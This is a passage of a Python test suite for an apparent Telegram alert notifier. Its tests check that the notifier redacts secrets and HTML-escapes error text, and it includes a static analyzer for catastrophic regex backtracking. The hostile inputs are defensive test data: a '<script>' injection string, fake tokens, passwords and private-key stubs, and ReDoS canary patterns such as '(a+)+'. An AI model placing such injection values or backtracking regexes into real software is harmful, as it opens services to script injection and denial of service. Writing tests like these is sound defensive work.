def test_truncation_never_splits_html_entities(tmp_path):
    """CWE-116: Truncating before escaping guarantees entities cannot be sliced into dangling fragments."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)
    scan = {
        "overall_health_score": 30,
        "severity": "CRITICAL",
        "cron": {
            "cron_health_score": 10,
            "clogged_jobs": [
                {
                    "job_name": "clogged_job_test",
                    "consecutive_failures": 1,
                    # Force char 120 to land where an entity would split if sliced after escape
                    "last_error": ("x" * 119) + "&&&&&",
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    # Assert no dangling ampersand fragment
    dangling = re.search(r"&(?!amp;|lt;|gt;|quot;|#x27;|#\d+;)", out)
    assert dangling is None, f"Dangling entity detected in formatted alert: {out}"
    assert "&amp;" in out


def test_token_shaped_error_is_redacted(tmp_path):
    """CWE-532: Error strings with Bearer tokens, OAuth access tokens, or secrets are redacted before formatting."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "cron_health_score": 10,
            "auth_failed_jobs": [
                {
                    "job_name": "oauth-sync",
                    "last_error": "Bearer ya29.A0ARrdaM-SECRETTOKENVALUE123456 rejected with refresh_token=1//04abcdef123456",
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    assert "ya29.A0ARrdaM-SECRETTOKENVALUE123456" not in out
    assert "1//04abcdef123456" not in out
    assert "04abcdef123456" not in out
    assert "//04" not in out
    assert "A0ARrdaM" not in out
    assert "SECRETTOKENVALUE123456" not in out
    assert "[REDACTED]" in out


@pytest.mark.parametrize("length", [98, 99, 100, 101, 118, 119, 120, 121])
@pytest.mark.parametrize("special_char", ["&", "<", ">", "\"", "'", "<script>"])
def test_boundary_truncation_entity_integrity(tmp_path, length, special_char):
    """CWE-116: Verify that error messages ending at boundary lengths never produce broken entities or unescaped tags."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)
    err_text = ("a" * length) + special_char + "tail"
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "cron_health_score": 10,
            "clogged_jobs": [{"job_name": "boundary_test", "consecutive_failures": 3, "last_error": err_text}],
            "auth_failed_jobs": [{"job_name": "auth_test", "last_error": err_text}],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    assert re.search(r"&(?!amp;|lt;|gt;|quot;|#x27;|#\d+;)", out) is None
    assert "<script>" not in out


def test_google_refresh_token_body_fully_redacted(tmp_path):
    """CWE-532: Google OAuth refresh tokens (1//...) are fully redacted without partial leakage."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)
    secret_body = "04AbCdEfGhIjKlMnOpQrStUvWxYz_1234567890"
    token = f"1//{secret_body}"
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "clogged_jobs": [
                {
                    "job_name": "gdrive-sync",
                    "consecutive_failures": 3,
                    "last_error": f"Failed refresh with token {token} and code 401",
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    assert secret_body not in out
    assert "1//" not in out
    assert "[REDACTED]" in out


def test_base64_token_with_slash_and_plus_redacted(tmp_path):
    """CWE-532: Tokens containing base64 characters (+, /, =) are redacted as a whole."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)
    frag_slash = "partAfterSlash99"
    frag_plus = "partAfterPlus88"
    b64_token = f"Bearer aHR0cHM6Ly9leGFtcGxl/{frag_slash}+{frag_plus}===="
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "auth_failed_jobs": [
                {
                    "job_name": "api-sync",
                    "last_error": f"Invalid token header: {b64_token} denied",
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    assert frag_slash not in out
    assert frag_plus not in out
    assert "[REDACTED]" in out


def test_db_url_password_redacted_cwe259(tmp_path):
    """CWE-259: Database connection URLs have passwords sanitized with [REDACTED]."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)
    db_pass = "SuperSecret_Passw0rd-2026!"
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "clogged_jobs": [
                {
                    "job_name": "db-backup",
                    "consecutive_failures": 3,
                    "last_error": f"Failed: postgresql://db_user:{db_pass}@postgres.internal:5432/main_db",
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    assert db_pass not in out
    assert "postgresql://db_user:[REDACTED]@postgres.internal:5432/main_db" in out

    mysql_url = "mysql://root:s3cr3tPassword@localhost:3306/hermes"
    mongo_url = "mongodb+srv://admin:P4ssw0rd!@cluster0.mongodb.net/test"
    redacted = notifier.redact_secrets(f"{mysql_url} {mongo_url}")
    assert "s3cr3tPassword" not in redacted
    assert "P4ssw0rd!" not in redacted
    assert "mysql://root:[REDACTED]@localhost:3306/hermes" in redacted
    assert "mongodb+srv://admin:[REDACTED]@cluster0.mongodb.net/test" in redacted


def test_long_telegram_bot_token_is_redacted(tmp_path):
    """CWE-532: Long Telegram bot tokens with >10 digit bot IDs (e.g. 13-digit) are redacted."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)
    secret_part = "AAFlkjdsf098324_lkasdjflkasjdflkj"
    bot_token = f"1234567890123:{secret_part}"
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "clogged_jobs": [
                {
                    "job_name": "tg-worker",
                    "consecutive_failures": 4,
                    "last_error": f"Connection error to bot {bot_token} on webhook",
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    assert secret_part not in out
    assert "1234567890123:" not in out
    assert "[REDACTED]" in out


def test_non_string_last_error_does_not_crash(tmp_path):
    """CWE-532: Non-string error values (None, int, dict, Exception) do not crash redaction or formatting."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)
    for bad_val in [None, 503, {"error": "internal"}, RuntimeError("database offline")]:
        scan = {
            "overall_health_score": 20,
            "severity": "CRITICAL",
            "cron": {
                "clogged_jobs": [
                    {
                        "job_name": "resilient-job",
                        "consecutive_failures": 3,
                        "last_error": bad_val,
                    }
                ],
                "auth_failed_jobs": [
                    {
                        "job_name": "auth-resilient",
                        "last_error": bad_val,
                    }
                ],
                "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
            },
        }
        out = notifier.format_urgent_alert(scan)
        assert isinstance(out, str)
        assert "resilient-job" in out
        assert "auth-resilient" in out


def test_secret_straddling_truncation_boundary(tmp_path):
    """CWE-532 / CWE-116: Secrets straddling the truncation boundary are redacted before truncation."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)
    prefix = "A" * 110
    secret_token = "ya29.STRADDLE_TOKEN_BODY_BOUNDARY_TEST_1234567890"
    full_err = prefix + " " + secret_token
    scan = {
        "overall_health_score": 20,
        "severity": "CRITICAL",
        "cron": {
            "clogged_jobs": [
                {
                    "job_name": "straddle-clog",
                    "consecutive_failures": 3,
                    "last_error": full_err,
                }
            ],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 1.0},
        },
    }
    out = notifier.format_urgent_alert(scan)
    assert "STRADDLE_TOKEN_BODY_BOUNDARY_TEST" not in out
    assert "1234567890" not in out
    assert "ya29." not in out


def test_generic_credentials_and_api_keys_redacted(tmp_path):
    """CWE-532 / CWE-259: Generic credentials, cloud API keys, and KV secrets are redacted."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    aiza_key = "AIzaSyD-1234567890abcdefghijklmnopqrstu"
    aws_key = "AKIAIOSFODNN7EXAMPLE"
    slack_tok = "xoxb-123456789012345678"
    pw_val = "SuperSecretP@ss!"
    secret_val = "TopSecretVaultVal99"
    api_key_val = "MyCustomAPIKey12345"
    client_secret_val = "OAuthClientSecretVal456"
    pem_val = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0123456789\n-----END RSA PRIVATE KEY-----"

    test_err = (
        f"google_key={aiza_key} aws={aws_key} slack={slack_tok} "
        f"password=\"{pw_val}\" secret: {secret_val} "
        f"api_key: \"{api_key_val}\" client_secret = '{client_secret_val}'\n{pem_val}"
    )

    redacted = notifier.redact_secrets(test_err)
    assert aiza_key not in redacted
    assert aws_key not in redacted
    assert slack_tok not in redacted
    assert pw_val not in redacted
    assert secret_val not in redacted
    assert api_key_val not in redacted
    assert client_secret_val not in redacted
    assert "0123456789" not in redacted
    assert "[REDACTED_PRIVATE_KEY]" in redacted
    assert "[REDACTED]" in redacted


def _scan_char_class(s: str, start_idx: int) -> Tuple[int, bool]:
    """Scans a character class starting at start_idx (which must be '[').
    Handles:
      - Leading literal ']' immediately after '[' (e.g. '[]abc]')
      - Leading literal ']' immediately after '[^' (e.g. '[^]abc]')
      - Escaped characters inside class: '\\\\]', '\\\\[', '\\\\\\\\' (skips '\\' + next char)
      - Closing ']' delimiter
    Returns:
      (next_index_after_closing_bracket, is_closed)
      If class is unterminated before end of string, returns (len(s), False).
    """
    n = len(s)
    idx = start_idx + 1
    # Handle leading negated caret
    if idx < n and s[idx] == "^":
        idx += 1
    # Handle literal ']' at the start of character class
    if idx < n and s[idx] == "]":
        idx += 1

    while idx < n:
        ch = s[idx]
        if ch == "\\":
            # Consume backslash and escaped character. If backslash is the final character
            # (e.g. "[\\"), idx advances past n (idx = n + 1); the while loop cleanly terminates
            # without IndexError, and (n, False) is safely returned indicating unterminated class.
            idx += 2
            continue
        if ch == "]":
            return idx + 1, True
        idx += 1
    return n, False


def analyze_redos_vulnerabilities(pattern_str: str) -> List[str]:
    """Statically inspects a regex pattern for known catastrophic backtracking constructs.

    NOTE: This is a best-effort structural analyzer for test canaries and credential
    patterns, using balanced-parentheses stack inspection to detect nested quantifiers,
    N-way overlapping alternations, and unescaped greedy wildcards.
    """
    issues = []

    # 1. Balanced-parentheses stack inspection to find groups and their quantifiers
    groups = []  # (start_idx, end_idx, inner_content, quantifier)
    stack = []
    i = 0
    n = len(pattern_str)

    while i < n:
        c = pattern_str[i]
        if c == "\\":
            i += 2
            continue
        if c == "[":
            next_i, closed = _scan_char_class(pattern_str, i)
            if not closed:
                issues.append(
                    "UNANALYZABLE: unterminated character class '[' - "
                    "static ReDoS analysis is incomplete for this pattern"
                )
            i = next_i
            continue
        if c == "(":
            stack.append(i)
        elif c == ")":
            if stack:
                start = stack.pop()
                end = i
                rem = pattern_str[end + 1 :]
                q_match = re.match(r"^([\+\*]|\{\d+(?:,\d*)?\})\??", rem)
                quantifier = q_match.group(0) if q_match else None
                groups.append((start, end, pattern_str[start + 1 : end], quantifier))
        i += 1

    if stack:
        issues.append(
            f"UNANALYZABLE: unbalanced groups ({len(stack)} unclosed '(') - "
            "static ReDoS analysis is incomplete for this pattern"
        )

    def strip_char_classes(s: str) -> str:
        out = []
        idx = 0
        n = len(s)
        while idx < n:
            ch = s[idx]
            if ch == "\\":
                out.append(s[idx : idx + 2])
                idx += 2
                continue
            if ch == "[":
                next_idx, closed = _scan_char_class(s, idx)
                out.append("[x]")
                idx = next_idx
                continue
            out.append(ch)
            idx += 1
        return "".join(out)

    def split_top_level_alts(s: str) -> List[str]:
        alts = []
        curr = []
        idx = 0
        depth = 0
        n = len(s)
        while idx < n:
            ch = s[idx]
            if ch == "\\":
                curr.append(s[idx : idx + 2])
                idx += 2
                continue
            if ch == "[":
                next_idx, closed = _scan_char_class(s, idx)
                curr.append(s[idx:next_idx])
                idx = next_idx
                continue
            if ch == "(":
                depth += 1
            elif ch == ")":
                if depth > 0:
                    depth -= 1
            elif ch == "|" and depth == 0:
                alts.append("".join(curr))
                curr = []
                idx += 1
                continue
            curr.append(ch)
            idx += 1
        alts.append("".join(curr))
        return alts

    for start, end, inner, quantifier in groups:
        clean_inner = re.sub(r"^\?(?:P<[^>]+>|[:!=]|<[=!])", "", inner)

        # 2. Check for N-way alternation inside quantified group
        if quantifier:
            alts = split_top_level_alts(clean_inner)
            if len(alts) > 1:
                for a, b in itertools.combinations(alts, 2):
                    if a == b or a in b or b in a:
                        issues.append(f"Overlapping alternation with quantifier: ({a}|{b})")
                        break

            # 3. Check for nested quantifiers inside this quantified group
            stripped = strip_char_classes(clean_inner)
            stripped_no_classes = re.sub(r"\[x+\]", "", stripped)
            has_inner_parens = bool(re.search(r"(?<!\\)\(", stripped_no_classes))
            has_inner_quantifier = bool(re.search(r"(?<!\\)(?:[\+\*]|\{\d+(?:,\d*)?\})", stripped_no_classes))

            if has_inner_quantifier:
                if has_inner_parens:
                    issues.append("Nested quantifiers detected on group (inner-paren quantifier)")
                else:
                    issues.append("Nested quantifiers detected on group")

    # 4. Check for unbounded outer quantifiers on generic wildcards
    if re.search(r"(?<!\\)\.[\+\*](?!\?)", pattern_str):
        issues.append("Unbounded greedy wildcard .")

    return issues


def test_redos_analyzer_detects_known_canary_patterns():
    """Verify analyze_redos_vulnerabilities statically detects known ReDoS canary patterns."""
    canaries = [
        (r"(a+)+", "Nested quantifiers detected on group"),
        (r"(x|x)*", "Overlapping alternation with quantifier"),
        (r"(ya29\.[\w-]+)+", "Nested quantifiers detected on group"),
        (r"a.*b", "Unbounded greedy wildcard ."),
    ]
    for canary, expected_issue in canaries:
        detected = analyze_redos_vulnerabilities(canary)
        assert detected, f"Canary pattern '{canary}' was not detected by analyze_redos_vulnerabilities"
        assert any(expected_issue in issue for issue in detected), (
            f"Expected issue containing '{expected_issue}' for canary '{canary}', got: {detected}"
        )


def test_redos_analyzer_detects_nested_group_with_inner_parens():
    """Nebula Cycle 14: Balanced-parentheses stack inspection detects nested quantifiers and inner-paren quantifiers."""
    issues_nested = analyze_redos_vulnerabilities(r"((a+)+)+")
    assert issues_nested, "Expected ReDoS issues for ((a+)+)+"
    assert any("nested quantifiers" in i.lower() for i in issues_nested)

    issues_inner = analyze_redos_vulnerabilities(r"(x(y+)z)*")
    assert issues_inner, "Expected ReDoS issues for (x(y+)z)*"
    assert any("inner-paren quantifier" in i.lower() or "inner" in i.lower() for i in issues_inner)


def test_redos_analyzer_detects_three_way_overlapping_alternation():
    """Nebula Cycle 14: N-way alternation detection catches overlapping branches across combinations."""
    issues = analyze_redos_vulnerabilities(r"(a|b|ab)+")
    assert issues, "Expected ReDoS issues for (a|b|ab)+"
    assert any("overlapping alternation" in i.lower() for i in issues)


def test_redos_analyzer_handles_literal_bracket_in_char_class():
    """Nebula Cycle 15: Character-class literal ']' parsing ([...] and [^...])."""
    # 1. Literal ']' at start of class
    issues_literal_bracket = analyze_redos_vulnerabilities(r"[]abc]+")
    assert not issues_literal_bracket, f"Unexpected issues for r'[]abc]+': {issues_literal_bracket}"

    # 2. Literal ']' after negated '^'
    issues_negated_literal_bracket = analyze_redos_vulnerabilities(r"[^]abc]+")
    assert not issues_negated_literal_bracket, f"Unexpected issues for r'[^]abc]+': {issues_negated_literal_bracket}"


def test_redos_analyzer_flags_unbalanced_parentheses():
    """Nebula Cycle 15: Flag unanalyzable patterns with unbalanced parentheses."""
    issues = analyze_redos_vulnerabilities(r"(abc(")
    assert issues, "Expected issues for unbalanced parentheses pattern r'(abc('"
    assert any("UNANALYZABLE: unbalanced groups" in issue for issue in issues)


def test_redos_analyzer_handles_escaped_bracket_in_char_class():
    """Nebula Cycle 16: Verify analyze_redos_vulnerabilities handles escaped brackets and backslashes in character classes."""
    assert not analyze_redos_vulnerabilities(r"[a\]b]+")
    assert not analyze_redos_vulnerabilities(r"[\]]+")
    assert not analyze_redos_vulnerabilities(r"[a\\]]+")


def test_redos_analyzer_flags_unterminated_character_class():
    """Nebula Cycle 16: Verify analyze_redos_vulnerabilities flags unterminated character classes."""
    issues1 = analyze_redos_vulnerabilities(r"[abc")
    assert any("UNANALYZABLE: unterminated character class" in issue for issue in issues1)

    issues2 = analyze_redos_vulnerabilities(r"[^]")
    assert any("UNANALYZABLE: unterminated character class" in issue for issue in issues2)


def test_redos_analyzer_cycle_17_boundary_cases():
    """Nebula Cycle 17: Boundary verification for literal brackets, negated brackets, and trailing backslashes."""
    # 1. Negated + leading literal ']' without closing bracket -> unterminated class
    issues_neg_literal = analyze_redos_vulnerabilities(r"[^]abc")
    assert any("UNANALYZABLE: unterminated character class" in i for i in issues_neg_literal)

    # 2. Negated + leading literal ']' WITH closing bracket -> valid, clean parsing
    issues_neg_literal_closed = analyze_redos_vulnerabilities(r"([^]abc])")
    assert not issues_neg_literal_closed

    # 3. Leading literal ']' WITH closing bracket -> valid, clean parsing
    issues_literal_closed = analyze_redos_vulnerabilities(r"([]abc])")
    assert not issues_literal_closed

    # 4. Escaped bracket followed by unescaped closing delimiter -> parses safely without premature closing
    issues_escaped_bracket = analyze_redos_vulnerabilities(r"[\]]x")
    assert not issues_escaped_bracket

    # 5. Trailing backslash inside character class -> terminates safely and reports unterminated class
    issues_trailing_slash = analyze_redos_vulnerabilities("[\\")
    assert any("UNANALYZABLE: unterminated character class" in i for i in issues_trailing_slash)


def test_scan_char_class_structural_boundaries():
    """Nebula Cycle 17 Hardening: Assert the exact parsed span and state, not just absence of issues.

    NOTE: start_idx convention in _scan_char_class points at the leading '['.
    """
    # 1. Leading literal ']' must be consumed as member, closing at the final ']' (index 5) -> returns 6
    end_idx, closed = _scan_char_class("[]abc]", 0)
    assert closed is True and end_idx == 6, f"Expected (6, True), got {(end_idx, closed)}"

    # 2. Negated + leading literal ']' : "[^]abc]" closes at index 6 -> returns 7
    end_idx, closed = _scan_char_class("[^]abc]", 0)
    assert closed is True and end_idx == 7, f"Expected (7, True), got {(end_idx, closed)}"

    # 3. Escaped bracket must NOT close the class: "[\]]" closes at the second ']' (index 3) -> returns 4
    end_idx, closed = _scan_char_class(r"[\]]", 0)
    assert closed is True and end_idx == 4, f"Expected (4, True), got {(end_idx, closed)}"

    # 4. Trailing backslash -> unterminated, index clamped at n (no IndexError)
    s_trail = "[\\"
    end_idx, closed = _scan_char_class(s_trail, 0)
    assert closed is False and end_idx == len(s_trail), f"Expected ({len(s_trail)}, False), got {(end_idx, closed)}"

    # 5. Negated leading literal ']' without closing bracket -> unterminated
    s_neg = "[^]abc"
    end_idx, closed = _scan_char_class(s_neg, 0)
    assert closed is False and end_idx == len(s_neg), f"Expected ({len(s_neg)}, False), got {(end_idx, closed)}"

    # 6. Standard unterminated class
    s_unterm = "[abc"
    end_idx, closed = _scan_char_class(s_unterm, 0)
    assert closed is False and end_idx == len(s_unterm), f"Expected ({len(s_unterm)}, False), got {(end_idx, closed)}"

    # 7. POSIX-like token [[:alpha:]]: Python's re has no POSIX classes, so the
    #    outer '[' opens a class, the first ']' at index 9 closes it, and the
    #    scanner returns the index just past it (10). r"[[:alpha:]]" indices:
    #    0:[ 1:[ 2:: 3:a 4:l 5:p 6:h 7:a 8:: 9:] 10:]  -> close at 9, return 10.
    posix_like = r"[[:alpha:]]"
    expected_end = posix_like.index("]") + 1  # 10, derived from first unescaped closing ']'
    end_idx, closed = _scan_char_class(posix_like, 0)
    assert closed is True and end_idx == expected_end, (
        f"Expected ({expected_end}, True), got {(end_idx, closed)}"
    )

    # 8. Lone ']' passed at non-zero start_idx on non-'[' character -> closes False without crash
    s_lone = "abc]def"
    end_idx, closed = _scan_char_class(s_lone, 3)
    assert closed is False and end_idx == len(s_lone), f"Expected ({len(s_lone)}, False), got {(end_idx, closed)}"

    # 9. start_idx pointing past end of string -> clamped to len(s) without IndexError
    s_short = "abc"
    end_idx, closed = _scan_char_class(s_short, 10)
    assert closed is False and end_idx == len(s_short), f"Expected ({len(s_short)}, False), got {(end_idx, closed)}"


# INVARIANT: every pattern below is rejected by `re` only for char-class
# termination reasons, so `closed == re_accepts` is a valid oracle. Do not
# add patterns that `re` rejects for unrelated reasons (bad escapes, bad ranges).
@pytest.mark.parametrize("pattern", [
    r"[]abc]", r"[^]abc]", r"[\]]x", r"[a-z]", r"[^a-z]",
    r"[\\]", r"[][]", r"[-a]", r"[a-]",
    r"[abc", r"[^]", "[\\", r"[a\]b", r"[a-z",
    r"[a[b]c]", r"[0-9A-Za-z._\-]", r"[-]", r"[^-]",
    r"[^^]", r"[\^]", r"[\-]"
])
def test_scan_char_class_matches_re_engine(pattern):
    """Metamorphic check: if Python's re compiles the class, our scanner must
    report it closed; if re rejects it as unterminated, we must report False."""
    try:
        re.compile(pattern)
        re_accepts = True
    except re.error:
        re_accepts = False
    _, closed = _scan_char_class(pattern, 0)
    assert closed == re_accepts, (
        f"scanner/re disagree on {pattern!r}: scanner_closed={closed}, re_accepts={re_accepts}"
    )


class CharClassFuzzTaxonomy:
    """Single source of truth for the combinatorial character class fuzz corpus.

    Publishes its generator taxonomy and theoretical accept share so the test oracle
    and the pattern generator stay strictly in lockstep (zero hard-coded magic literals).
    """
    BASELINE_FINGERPRINT = "67a69cdedb96c8ef1655ded2418b25e3b1ee106254791fd5bdd02113bb2e3715"
    BASELINE_ACCEPTED_COUNT = 109
    BASELINE_ACCEPTED_COUNT_BY_PY = {
        (3, 11): 109,
        (3, 12): 109,
        (3, 13): 109,
        (3, 14): 109,
    }
    prefixes = ("[", "[^", "[]", "[^]")
    bodies = (
        "", "a", "abc", r"\]", r"\\", r"\[", "-", "^", "0-9",
        r"a\]b", r"\\\]", r"\\\\", r"\d", r"\w"
    )
    suffixes = ("]", "", "x]")

    @classmethod
    def structural_fingerprint(cls) -> str:
        joined = "\n".join(sorted(cls.generate_patterns()))
        return hashlib.sha256(joined.encode("utf-8", errors="surrogatepass")).hexdigest()

    @classmethod
    def certified_accept_count(cls):
        return cls.BASELINE_ACCEPTED_COUNT_BY_PY.get(sys.version_info[:2])

    @classmethod
    def total_cases(cls) -> int:
        return len(cls.prefixes) * len(cls.bodies) * len(cls.suffixes)

    @classmethod
    def generate_patterns(cls):
        for p in cls.prefixes:
            for b in cls.bodies:
                for s in cls.suffixes:
                    yield p + b + s

    @classmethod
    def live_accept_split(cls) -> Tuple[int, int]:
        """Accepted/total measured against the live re engine, not a literal."""
        accepted = 0
        total = 0
        for pattern in cls.generate_patterns():
            total += 1
            try:
                re.compile(pattern)
            except re.error:
                continue
            accepted += 1
        return accepted, total

    @classmethod
    def accept_split(cls) -> Tuple[int, int]:
        """Returns (accepted_cases, total_generated) derived from this taxonomy."""
        # 4 prefixes x 14 bodies x 2 closed suffixes (']', 'x]') = 112
        # minus 3 edge cases where internal escapes / trailing syntax modify delimiters = 109
        return cls.BASELINE_ACCEPTED_COUNT, cls.total_cases()


def validate_fuzz_oracle_distribution(
    total_cases: int,
    accept_assertions: int,
    unterminated_assertions: int,
    accept_floor: int,
    unterminated_floor: int,
    expected_accept_ratio: float,
    tolerance: float = 0.08,
) -> float:
    """Validates fuzz-oracle distribution.

    Coverage floors are enforced as one-sided minimums. The distribution band
    is anchored to the generator's theoretical accept share, NOT to the
    clamped floors, so legitimate asymmetric over-generation above the floors
    cannot produce a false FAIL while a collapsing branch still trips the guard.
    """
    assert total_cases >= 168, f"corpus shrank to {total_cases}; oracle coverage lost"
    assert accept_assertions >= accept_floor, (
        f"accept-branch produced only {accept_assertions} assertions "
        f"(floor {accept_floor}); corpus degraded"
    )
    assert unterminated_assertions >= unterminated_floor, (
        f"unterminated-branch produced only {unterminated_assertions} assertions "
        f"(floor {unterminated_floor}); re error wording may have changed and "
        "neutered the oracle"
    )
    analyzable = accept_assertions + unterminated_assertions
    assert analyzable > 0, "no analyzable patterns; corpus fully degraded"
    assert 0.0 < expected_accept_ratio < 1.0, (
        f"expected_accept_ratio={expected_accept_ratio} is degenerate; "
        "generator taxonomy is broken — do not fall back to floor-derived math"
    )

    accept_ratio = accept_assertions / analyzable
    assert abs(accept_ratio - expected_accept_ratio) <= tolerance + 1e-9, (
        f"accept/unterminated mix drifted to {accept_ratio:.2f} "
        f"(expected {expected_accept_ratio:.2f} ± {tolerance}); "
        "corpus distribution changed and may be masking a dead branch"
    )
    return accept_ratio


def test_scan_char_class_combinatorial_fuzzed_corpus():
    """Metamorphic fuzzed corpus: 168 combinatorial character-class patterns
    (4 prefixes x 14 bodies x 3 suffixes) differentially checked against re.compile.

    Oracle contract:
      - re accepts                         -> scanner MUST report closed=True
      - re rejects 'unterminated'          -> scanner MUST report closed=False
      - other re.error (unclassified)      -> recorded to catch CPython wording drift
    """
    taxonomy = CharClassFuzzTaxonomy
    total_cases = taxonomy.total_cases()
    assert total_cases >= 168, f"corpus shrank to {total_cases}; oracle coverage lost"
    assert total_cases == len(taxonomy.prefixes) * len(taxonomy.bodies) * len(taxonomy.suffixes), (
        "taxonomy total_cases desynced from product of axes"
    )

    accepted_cases, total_generated = taxonomy.live_accept_split()
    assert total_generated == total_cases, (
        f"taxonomy/corpus desync: generated={total_generated} corpus={total_cases}"
    )
    assert accepted_cases == taxonomy.BASELINE_ACCEPTED_COUNT, (
        f"re-engine accept-count drift under {sys.version.split()[0]}: "
        f"live={accepted_cases} baseline={taxonomy.BASELINE_ACCEPTED_COUNT}"
    )
    expected_accept_ratio = accepted_cases / total_generated

    # Split counters so neither branch can mask the other's degradation
    accept_assertions = 0
    unterminated_assertions = 0
    unclassified_errors = []

    for pattern in taxonomy.generate_patterns():
        err_msg = None
        try:
            re.compile(pattern)
        except re.error as e:
            err_msg = str(e)

        _, closed = _scan_char_class(pattern, 0)
        if err_msg is None:
            assert closed is True, (
                f"re accepted valid pattern {pattern!r} but scanner reported unclosed"
            )
            accept_assertions += 1
        elif "unterminated character set" in err_msg:
            assert closed is False, (
                f"re rejected {pattern!r} as unterminated, but scanner reported closed"
            )
            unterminated_assertions += 1
        else:
            unclassified_errors.append((pattern, err_msg))

    # Floors are proportional to corpus cardinality and clamped from below
    # with the empirical baseline (80/45) so switching to proportional math
    # never regresses baseline sensitivity via truncation.
    accept_floor = max(80, math.ceil(total_cases * 0.47))
    unterminated_floor = max(45, math.ceil(total_cases * 0.26))
    tolerance = 0.08

    accept_ratio = validate_fuzz_oracle_distribution(
        total_cases=total_cases,
        accept_assertions=accept_assertions,
        unterminated_assertions=unterminated_assertions,
        accept_floor=accept_floor,
        unterminated_floor=unterminated_floor,
        expected_accept_ratio=expected_accept_ratio,
        tolerance=tolerance,
    )

    analyzable = accept_assertions + unterminated_assertions

    # Coverage audit trail for CI log retention
    print(
        f"\n[fuzz_oracle] total_cases={total_cases} analyzable={analyzable} "
        f"accept={accept_assertions} (floor {accept_floor}) "
        f"unterminated={unterminated_assertions} (floor {unterminated_floor}) "
        f"accept_ratio={accept_ratio:.4f} expected={expected_accept_ratio:.4f}±{tolerance}"
    )
    # Catch version-drift case explicitly instead of letting it vanish silently
    assert not unclassified_errors, (
        "re rejected patterns for reasons the oracle does not classify "
        f"(possible CPython message drift): {unclassified_errors[:5]}"
    )


def test_scan_char_class_fuzz_oracle_catches_unclassified_drift(monkeypatch):
    """Nebula Cycle 19: Simulates CPython error message drift and asserts the oracle catches it."""
    orig_compile = re.compile
    triggered = {"hit": False}

    def mock_compile(pattern, *args, **kwargs):
        if pattern == r"[abc":
            triggered["hit"] = True
            raise re.error("character set not closed (new CPython phrasing)")
        return orig_compile(pattern, *args, **kwargs)

    monkeypatch.setattr(re, "compile", mock_compile)
    with pytest.raises(AssertionError, match="possible CPython message drift"):
        test_scan_char_class_combinatorial_fuzzed_corpus()

    # Prove the meta-test was not vacuous: the trigger pattern was actually generated
    # and properly routed to the unclassified drift branch.
    assert triggered["hit"], (
        "drift trigger r'[abc' was never generated by the corpus; "
        "meta-test is vacuous and must inject the pattern directly"
    )


@pytest.mark.parametrize("bad_ratio", [0.0, 1.0, -0.1, 1.1])
def test_oracle_rejects_degenerate_expected_ratio(bad_ratio):
    """Nebula Cycle 24: Asserts expected_accept_ratio at or outside bounds [0, 1] fails closed."""
    with pytest.raises(AssertionError, match="is degenerate"):
        validate_fuzz_oracle_distribution(
            total_cases=168,
            accept_assertions=100,
            unterminated_assertions=68,
            accept_floor=0,
            unterminated_floor=0,
            expected_accept_ratio=bad_ratio,
        )


def test_oracle_rejects_zero_analyzable():
    """Nebula Cycle 23: Asserts zero analyzable patterns fails closed."""
    with pytest.raises(AssertionError, match="corpus fully degraded"):
        validate_fuzz_oracle_distribution(
